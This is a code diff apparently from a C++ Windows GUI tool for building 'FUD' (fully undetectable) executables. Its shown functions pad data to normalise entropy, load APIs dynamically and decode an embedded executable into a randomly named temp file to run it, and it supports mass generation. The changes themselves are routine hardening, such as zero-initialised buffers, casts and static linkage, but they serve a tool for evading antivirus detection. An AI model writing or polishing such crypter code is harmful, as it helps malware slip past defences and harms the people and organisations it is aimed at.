@@ -307,7 +307,7 @@ public:
         std::vector<uint8_t> normalized = data;
         
         // Add realistic padding to normalize entropy
-        size_t paddingSize = 512 + (randomEngine.generateRandomDWORD() % 1024);
+        size_t paddingSize = 512U + ((size_t)randomEngine.generateRandomDWORD() % 1024U);
         std::vector<uint8_t> padding = generateNormalEntropy(paddingSize);
         
         normalized.insert(normalized.end(), padding.begin(), padding.end());
@@ -406,7 +406,7 @@ int loadAPIsAndExecute() {
     if (pMessageBoxA && pGetComputerNameA && pGetVersion) {
         // Use APIs dynamically
         DWORD version = pGetVersion();
-        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+        char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
         DWORD size = sizeof(computerName);
         pGetComputerNameA(computerName, &size);
         
@@ -649,7 +649,7 @@ bool extractAndExecuteOriginalPE() {
         std::vector<uint8_t> originalPE = base64Decode(fullPEData);
         
         // Create temporary file with random name
-        char tempPath[MAX_PATH];
+        char tempPath[MAX_PATH] = {0};
         GetTempPathA(MAX_PATH, tempPath);
         std::string tempFile = std::string(tempPath) + "tmp_)" + randomEngine.generateRandomName(12) + R"(.exe";
         
@@ -1475,7 +1475,7 @@ static void startMassGeneration() {
     if (g_massGenerationActive) return;
     
     // Get count from edit box
-    wchar_t countBuffer[10];
+    wchar_t countBuffer[10] = {0};
     GetWindowTextW(g_hMassCountEdit, countBuffer, 10);
     int count = _wtoi(countBuffer);
     
@@ -1519,7 +1519,7 @@ static std::string wstringToString(const std::wstring& wstr) {
     return strTo;
 }
 
-std::string browseForFile(HWND hwnd, bool save = false) {
+static std::string browseForFile(HWND hwnd, bool save = false) {
     OPENFILENAMEA ofn;
     char szFile[260] = {0};
     
@@ -1542,8 +1542,8 @@ std::string browseForFile(HWND hwnd, bool save = false) {
     return "";
 }
 
-void createFUDExecutable() {
-    wchar_t inputBuffer[MAX_PATH], outputBuffer[MAX_PATH];
+static void createFUDExecutable() {
+    wchar_t inputBuffer[MAX_PATH] = {0}, outputBuffer[MAX_PATH] = {0};
     GetWindowTextW(g_hInputPath, inputBuffer, MAX_PATH);
     GetWindowTextW(g_hOutputPath, outputBuffer, MAX_PATH);
     
@@ -1593,7 +1593,7 @@ void createFUDExecutable() {
     SendMessage(g_hProgressBar, PBM_SETPOS, 0, 0);
 }
 
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     switch (uMsg) {
         case WM_CREATE: {
             // Input file controls
@@ -1716,7 +1716,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
         
         case WM_DROPFILES: {
             HDROP hDrop = (HDROP)wParam;
-            wchar_t droppedFile[MAX_PATH];
+            wchar_t droppedFile[MAX_PATH] = {0};
             
             if (DragQueryFileW(hDrop, 0, droppedFile, MAX_PATH)) {
                 SetWindowTextW(g_hInputPath, droppedFile);
